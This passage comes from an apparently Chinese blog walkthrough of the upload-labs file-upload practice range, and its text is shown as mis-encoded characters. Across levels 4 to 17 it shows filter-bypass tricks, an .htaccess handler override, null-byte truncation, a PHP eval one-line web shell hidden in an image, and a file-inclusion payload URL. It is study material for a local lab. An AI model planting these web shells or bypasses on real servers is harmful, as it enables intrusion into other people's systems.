        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è½¬æ¢ä¸ºå°å†™</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ”¶å°¾å»ç©º</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>å¥½å¤šè¢«é™åˆ¶çš„é¢ï¼Œä½†æ˜¯æ²¡æœ‰é™åˆ¶<code>.htaccess</code>æ–‡ä»¶ã€‚ç„¶åå°±å¯ä»¥ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶ã€‚<br>è¿™ä¹‹å‰ï¼Œéœ€è¦è¿›è¡Œä¸€äº›æ”¹åŠ¨ï¼Œåœ¨apacheè§£æé‚£ä¸ªæ–‡ä»¶ä¸­ï¼Œæ£€æŸ¥mod_writeæ¨¡å—æ˜¯å¦å¼€å¯ï¼Œè¿˜æœ‰<code>AllowOverride All</code><br>å…ˆä¸Šä¼ ä¸€ä¸ª<code>1.htaccess</code>æ–‡ä»¶ï¼Œ</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell">AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token punctuation">.</span>jpg</code></pre>
<p>ç„¶åä¸Šä¼ shell.jpgå°±å¯ä»¥å°è¯•ç”¨èšå‰‘èœåˆ€ç­‰å·¥å…·è¿æ¥äº†ã€‚<br>ä¼¤å¿ƒäº‹ä¸€ç¬”å¸¦è¿‡ã€‚=_=</p>
<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>è¿™ä¸ªå†ä¸Šä¼ htaccessæ–‡ä»¶å·²ç»ä¸å¯ä»¥äº†ï¼Œä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥çœ‹çœ‹æºç ã€‚<br><img src="https://img-blog.csdnimg.cn/202005111627009.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>è«æ˜çš„æƒ³ç¬‘ï¼Œæˆ‘çš„ç¬¬äº”å…³è·Ÿåˆ«äººçš„ä¸ä¸€æ ·ï¼Œç›´æ¥åŸºç¡€çš„è¿‡æ»¤éƒ½ç»™çœç•¥äº†ï¼Œï¼ˆå¤§å°å†™ç»•è¿‡ï¼Œç‚¹ç»•è¿‡ï¼Œç©ºæ ¼ç»•è¿‡ï¼‰<br>è¿™é‡Œç›´æ¥ç»¼åˆä½¿ç”¨ï¼š<br>å…ˆå°†phpæ–‡ä»¶ä¸Šä¼ æŠ“åŒ…ï¼Œ<br><img src="https://img-blog.csdnimg.cn/20200511163223684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>å®ƒè¦è¿‡æ»¤ï¼Œé‚£å°±åˆ¶é€ ç»™å®ƒè¿‡æ»¤ï¼Œè®©å®ƒå…ˆè¿‡æ»¤ç©ºæ ¼å’Œç‚¹ï¼Œæœ€åè¿˜å‰©ä¸‹ç‚¹ï¼Œä¾æ—§èƒ½ä¸Šä¼ ï¼Œå°è¯•è¿æ¥ã€‚<br><img src="https://img-blog.csdnimg.cn/20200511163503549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>OKï¼Œé˜”ä»¥ã€‚</p>
<h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>å‘ƒå‘ƒå‘ƒï¼Œæˆ‘å‘ç°è¿™ä¸ªæ˜¯å¤§å°å†™è¿‡æ»¤ï¼Œï¼Œï¼Œæ€ä¹ˆåˆ°åé¢æ¥äº†ï¼Œ<br>è¿™ä¸ªå°±æ˜¯å°†<code>shell.php</code>ä¸Šä¼ æŠ“åŒ…æ”¹åç¼€ä¸º<code>Php</code>å°±å¯ä»¥ç»•è¿‡äº†ã€‚</p>
<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>ç©ºæ ¼ç»•è¿‡ï¼Œè¿™ä¸ªåœ¨<code>shell.php</code>ååŠ ä¸ªç©ºæ ¼å°±OKäº†ï¼Œ<br>æŠ“åŒ…æ”¹æˆ<code>shell.php </code>ä¸Šä¼ ã€‚</p>
<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>ç‚¹è¿‡æ»¤ï¼ŒæŠ“åŒ…ï¼Œä¿®æ”¹åç¼€ä¸º<code>shell.php.</code>ï¼Œå³å¯è¿›è¡Œç‚¹è¿‡æ»¤ã€‚</p>
<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><code>::$DATA</code>ç»•è¿‡,</p>
<blockquote>
<p><code>åœ¨php+windowsçš„æƒ…å†µä¸‹ï¼šå¦‚æœæ–‡ä»¶å+&quot;::$DATA&quot;ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒ&quot;::$DATA&quot;ä¹‹å‰çš„æ–‡ä»¶åã€‚åˆ©ç”¨windowsç‰¹æ€§ï¼Œå¯åœ¨åç¼€åä¸­åŠ â€ ::$DATAâ€ç»•è¿‡</code></p>
</blockquote>
<p>è¿™æ˜¯ç½‘ä¸Šçš„å¤§ä½¬ç»™çš„è§£é‡Šï¼Œç®€å•æ˜äº†ã€‚å®¹æ˜“ç†è§£ã€‚<br>è¿˜æ˜¯æŠ“åŒ…ä¿®æ”¹<br><img src="https://img-blog.csdnimg.cn/20200511170305633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>æµ‹è¯•è¿æ¥ï¼Œçœ‹åˆ°è¿æ¥æˆåŠŸäº†ã€‚<br><img src="https://img-blog.csdnimg.cn/20200511170350369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p>
<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>eeee,ç¬¬åå…³å¥½åƒè·Ÿç¬¬äº”å…³ä¸€æ ·äº†ï¼Œï¼Ÿï¼Ÿï¼Ÿ<br><img src="https://img-blog.csdnimg.cn/20200511170652283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>ä»”ç»†å¯¹æ¯”äº†ä¸€ä¸‹ï¼Œæºç éƒ½ä¸€æ ·çš„ï¼Œ=_=ï¼Œç›´æ¥è¿‡äº†å“ˆã€‚</p>
<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>æŸ¥çœ‹æºç å¯ä»¥çœ‹å‡º,è¿™é‡Œä½¿ç”¨äº†æ›¿æ¢å‡½æ•°ã€‚<br><img src="https://img-blog.csdnimg.cn/20200511171014758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>è¯•ä¸€ä¸‹ï¼Œè¿™é‡Œæˆ‘åŠ ä¸ªç‚¹ï¼Œå°è¯•ç‚¹ç»•è¿‡ã€‚<br><img src="https://img-blog.csdnimg.cn/20200511171142217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>ç„¶åå¤åˆ¶å›¾åƒåœ°å€çœ‹ä¸€ä¸‹ã€‚<br><img src="https://img-blog.csdnimg.cn/20200511171524604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>å†çœ‹çœ‹uploadçš„æ–‡ä»¶å¤¹<br><img src="https://img-blog.csdnimg.cn/20200511171328208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>è¿™é‡ŒçŸ¥é“å®ƒæ˜¯å°†phpæ›¿æ¢æˆâ€ç©ºæ ¼â€äº†ã€‚<br>å—¯ï¼Œè¿™é‡Œå¯ä»¥è¿›è¡ŒåŒå†™ç»•è¿‡â€¦â€¦<br><img src="https://img-blog.csdnimg.cn/20200511171753880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>æµ‹è¯•è¿æ¥ï¼Œè¿æ¥æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20200511171839344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p>
<h2 id="Pass-12-00æˆªæ–­Get"><a href="#Pass-12-00æˆªæ–­Get" class="headerlink" title="Pass-12 %00æˆªæ–­Get"></a>Pass-12 %00æˆªæ–­Get</h2><p><img src="https://img-blog.csdnimg.cn/20200511174326316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>ä»£ç è§£æ;<br>è¿™ä¸ªæ˜¯å¯¹æœåŠ¡å™¨ç«¯ä¸Šä¼ æ–‡ä»¶åçš„åç¼€åšäº†é™åˆ¶ï¼Œ<br>è¿™é‡Œæ²¡æœ‰è®¾ç½®é»‘åå•ï¼Œè€Œæ˜¯ç™½åå•ï¼Œè§„å®šåªèƒ½ä¸Šä¼ jpg/png/gifæ ¼å¼çš„å›¾ç‰‡ã€‚<br><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>å¯çŸ¥ä¸Šä¼ è·¯å¾„å‘½åè§„åˆ™ä½¿ç”¨ç”¨æˆ·getè¯·æ±‚çš„save_pathå€¼æ‹¼æ¥è€Œæˆã€‚<br>å¯ä»¥è€ƒè™‘%00æˆªæ–­ï¼Œä½†æ˜¯å¥½åƒphp%00æˆªæ–­åªå¯¹phpç‰ˆæœ¬&lt;5.3çš„é€‚ç”¨ï¼Œæˆ‘çš„æ˜¯5.4ï¼Œä¸çŸ¥é“è¡Œä¸è¡Œï¼Œè¯•ä¸€ä¸‹å§ã€‚<br>æŠ“åŒ…è¿›è¡Œä¿®æ”¹ã€‚<br><img src="https://img-blog.csdnimg.cn/20200511175244701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>æœç„¶ä¸è¡Œï¼Œä¸Šä¼ å‡ºé”™äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/2020051117533873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>åˆ‡æ¢åˆ°5.3çš„ç‰ˆæœ¬åº”è¯¥å°±è¡Œäº†ã€‚</p>
<h2 id="Pass-13-00æˆªæ–­POST"><a href="#Pass-13-00æˆªæ–­POST" class="headerlink" title="Pass-13 00æˆªæ–­POST"></a>Pass-13 00æˆªæ–­POST</h2><p>æŸ¥çœ‹æºç å‘ç°æ˜¯åŸºäºpostçš„save_pathï¼Œåšé¢˜å¦‚ä½•åˆ¤æ–­æ˜¯getè¿˜æ˜¯postï¼ŒæŠ“åŒ…æŸ¥çœ‹save_pathåœ¨ä»€ä¹ˆä½ç½®ï¼Œåœ¨ä¸Šé¢çš„urlçš„ä½ç½®ä¸Šå°±æ˜¯getï¼Œå¦‚ä¸‹çš„æƒ…å†µå°±æ˜¯postã€‚<br><img src="https://img-blog.csdnimg.cn/20200511182305466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>ä¿®æ”¹ï¼Œå› ä¸ºæ˜¯postæ–¹å¼ï¼Œå®ƒä¸getæ–¹å¼ä¸åŒçš„å°±æ˜¯ï¼Œå®ƒä¸ä¼šå¯¹%00è‡ªåŠ¨è¿›è¡Œè§£ç ï¼Œæ‰€ä»¥åœ¨äºŒè¿›åˆ¶ä¸­ä¿®æ”¹ã€‚<br><img src="https://img-blog.csdnimg.cn/20200511182409426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/2020051118260279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p>
<p>æµ‹è¯•è¿æ¥ï¼Œå¯ä»¥è¿ä¸Šã€‚<br><img src="https://img-blog.csdnimg.cn/20200511182855402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p>
<h2 id="Pass-14å›¾ç‰‡é©¬"><a href="#Pass-14å›¾ç‰‡é©¬" class="headerlink" title="Pass-14å›¾ç‰‡é©¬"></a>Pass-14å›¾ç‰‡é©¬</h2><p><img src="https://img-blog.csdnimg.cn/20200512090543515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>åˆ¶ä½œå›¾ç‰‡shell</p>
<pre class="language-php" data-language="php"><code class="language-php">GIF98A
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>
<p>ç„¶åæ”¹ä¸ºå›¾ç‰‡æ ¼å¼çš„åç¼€ã€‚<br>ä¸Šä¼ â€¦â€¦<br><img src="https://img-blog.csdnimg.cn/20200512093100951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>ç„¶åï¼Œæç¤ºæœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå¯ä»¥æŸ¥çœ‹ä¸€ä¸‹ã€‚<br><img src="https://img-blog.csdnimg.cn/20200512093153787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>å…³äºæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¹‹å‰å­¦ä¹ ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œç„¶åäº†è§£äº†ä¸€ä¸‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå…·ä½“å­¦ä¹ çš„åšå®¢æ­£åœ¨å†™äº†ï¼Œå®Œå–„å®Œæˆåå‘ã€‚<br>è¿™é‡Œç›´æ¥åˆ©ç”¨ã€‚<br>æ„é€ payload</p>
<pre class="language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;include.php?file&#x3D;4420200512095517.gif</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020051209391194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>è®¿é—®ï¼Œå¯ä»¥ã€‚<br>å°è¯•èšå‰‘è¿æ¥ã€‚<br><img src="https://img-blog.csdnimg.cn/20200512094009859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>ç»ˆäºæˆåŠŸäº†ï¼Œgetã€‚<br>æ³¨æ„äº‹é¡¹ï¼š<code>include.php</code>å¿…é¡»åœ¨uploadç›®å½•ä¸‹ï¼Œæˆ–è€…è¿™ä¹ˆè¯´ï¼š<code>include.php</code>å¿…é¡»å’Œä¸Šä¼ çš„æ–‡ä»¶(å›¾ç‰‡é©¬)åœ¨åŒä¸€ç›®å½•ä¸‹ã€‚</p>
<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>ç»§ç»­ä¸Šä¼ åˆšæ‰çš„å›¾ç‰‡é©¬(ä¸Šä¸€å…³ä¸Šä¼ çš„æˆ‘å·²ç»åˆ é™¤äº†)<br>æˆåŠŸäº†ï¼Œæµ‹è¯•è¿æ¥ï¼Œä¹Ÿå¯ä»¥<br><img src="https://img-blog.csdnimg.cn/20200512095949200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>è¿™å…³æ˜¯ï¼Œç”¨getimagesizeå‡½æ•°åˆ¤æ–­æ–‡ä»¶ç±»å‹å›¾ç‰‡é©¬æ²¡ä»€ä¹ˆå½±å“ã€‚å¯ä»¥ä½¿ç”¨ã€‚</p>
<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>å·²ä¹…ä¼ äº†æˆ‘ç™¾ä¼ ä¸åŒçš„â€œå›¾ç‰‡â€ï¼Œå‘ç°ä¾æ—§ç®¡ç”¨ã€‚<br><img src="https://img-blog.csdnimg.cn/20200512101250421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>æŸ¥çœ‹æºç ï¼š<br><img src="https://img-blog.csdnimg.cn/20200512101819686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>æŸ¥çœ‹åå‘ç°æˆ‘å·²ç»æ˜¯å¼€ç€è¿™ä¸ªæ¨¡å—çš„ã€‚æ‰€ä»¥æ‰æˆåŠŸäº†ï¼Œ<br>è€ƒç‚¹ï¼šä½¿ç”¨php_exifæ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œå·²ä¹…å¯ä»¥ä½¿ç”¨å›¾ç‰‡é©¬ã€‚</p>
<h2 id="Pass-17äºŒæ¬¡æ¸²æŸ“"><a href="#Pass-17äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="Pass-17äºŒæ¬¡æ¸²æŸ“"></a>Pass-17äºŒæ¬¡æ¸²æŸ“</h2><p>è¿™ä¸€å…³æœ‰æ‰€å˜åŒ–ï¼Œ<img src="https://img-blog.csdnimg.cn/20200512102044331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>è¿™ä¸ªå›¾ç‰‡é©¬ä¸ç®¡ç”¨äº†ï¼Œé‚£å°±å†æ¢ä¸€ä¸ªã€‚<br>ä¹‹å‰è®°å¾—å­¦è¿‡å°†phpä¸€å¥è¯ä¸æ­£å¸¸å›¾ç‰‡æ‹¼æ¥æˆä¸€ä¸ªå›¾ç‰‡é©¬ã€‚åœ¨ç¡¬ç›˜è§’è½é‡Œæ‰¾åˆ°äº†å®ƒã€‚<br>è¿˜æ˜¯å†å†™ä¸€éåˆ¶ä½œæ–¹æ³•ï¼šä½¿ç”¨windowså‘½ä»¤ä¸­çš„copy</p>
<pre class="language-cmd" data-language="cmd"><code class="language-cmd">copy 1.jpg&#x2F;b+shell.php&#x2F;a 1000.jpg</code></pre>
<p>å°±å¯ä»¥ç”Ÿæˆå›¾ç‰‡é©¬äº†ã€‚<br>ä¸Šä¼ â€¦â€¦<br><img src="https://img-blog.csdnimg.cn/20200512102547291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>ç„¶åå‘ç°æ‰¾ä¸åˆ°æˆ‘çš„ä¸€å¥è¯äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/20200512105346939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>æŒ‰ç†è¯´ï¼Œæˆ‘çš„ä¸€å¥è¯åº”è¯¥æ˜¯åœ¨è¿™é‡Œçš„ï¼Œä¸è§äº†ã€‚æŸ¥è¿‡èµ„æ–™å‘ç°æ˜¯è¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“ã€‚<br>æŸ¥çœ‹æºç ï¼š<br><img src="https://img-blog.csdnimg.cn/20200512105528292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>ä¸Šé¢è¿˜è¿›è¡Œäº†åˆ¤æ–­content-typeè¿˜æœ‰åç¼€ç­‰ã€‚äºŒæ¬¡æ¸²æŸ“ä¸çŸ¥é“æ€ä¹ˆç»•è¿‡ã€‚çœ‹çœ‹å¤§ä½¬çš„æ–‡ç« ï¼Œæ²¡æœ‰éšä¾¿è½¬è½½å’Œå¤ç°ï¼Œæ„Ÿè§‰å¤§ä½¬å†™çš„å¾ˆè¯¦ç»†ï¼Œä¸‹æ¬¡å†çœ‹ç›´æ¥å»çœ‹åŸåˆ›ã€‚ç•™ä¸ªé—¨ï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-13">ä¼ é€é—¨</a><br>phpä¸€å¥è¯è¢«å†™åœ¨äº†ä¸­é—´çš„ä½ç½®ï¼Œä¹Ÿä¸æ˜¯éšä¾¿æŒ‘çš„ä½ç½®ã€‚æœ‰æ–¹æ³•å»å†™çš„ã€‚</p>
<p>åˆ°æ­¤å…ˆåœä¸‹ï¼Œè¿™ä¸ªäºŒæ¬¡æ¸²æŸ“å·²ç»ä¸ä¼šäº†ï¼Œåé¢çš„ä¹Ÿå…ˆä¸çœ‹äº†ã€‚çœ‹ä¸å®šè¿˜æµªè´¹æ—¶é—´ã€‚ç­‰æ°´å¹³æé«˜ä¸€ç‚¹äº†å†æŠŠè¿™ä¸ªé¶åœºè¿‡å®Œã€‚</p>
<p>æ–‡æœ«å¯„è¯­ï¼š</p>
<blockquote>
